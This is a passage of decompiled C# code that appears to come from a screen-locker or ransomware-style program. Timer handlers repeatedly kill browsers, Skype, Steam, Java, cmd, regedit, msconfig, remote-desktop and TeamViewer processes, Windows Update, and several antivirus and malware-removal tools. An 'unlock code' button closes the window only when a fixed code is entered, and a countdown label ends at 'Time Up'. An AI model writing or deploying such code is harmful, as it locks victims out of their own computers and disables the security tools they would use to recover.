	private void Timer2_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "Skype", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "chrome", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer4_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "iexplore", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer5_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "javaw", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer6_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "java", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer7_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "Steam", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer8_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "firefox", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer9_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "regedit", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer10_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "CCleaner64", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer11_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "wuauclt", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer12_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "uTorrent", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer13_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "jusched", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer14_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "mbam", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer15_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "opera", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer16_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "TeamViewer", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer17_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "cmd", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer18_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "msconfig", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer19_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "mstsc", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer20_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "eset_nod32_antivirus_live_installer", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer21_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "avgmfapx", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer22_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "kav14.0.0.4651en-gb", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer23_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "kis14.0.0.4651aEN_4955", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer24_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "BullGuardDownloaderBPP_uksem30bpp", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(TextBox1.get_Text(), "test", false) == 0)
		{
			((Form)this).Close();
		}
		else
		{
			Interaction.MsgBox((object)"Incorrect unlock code", (MsgBoxStyle)16, (object)"Error");
		}
	}

	private void Timer25_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "ProcessHacker", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void Timer26_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "Ultimate_Process_Killer_2.0.2", false) == 0)
			{
				process.Kill();
			}
		}
	}

	private void RichTextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void Button2_Click(object sender, EventArgs e)
	{
	}

	private void Timer27_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(Label1.get_Text(), "0", false) == 0)
		{
			Label1.set_Text("Time Up");
		}
		else
		{
			Label1.set_Text(Conversions.ToString(Conversions.ToDouble(Label1.get_Text()) - 1.0));
		}
	}
}
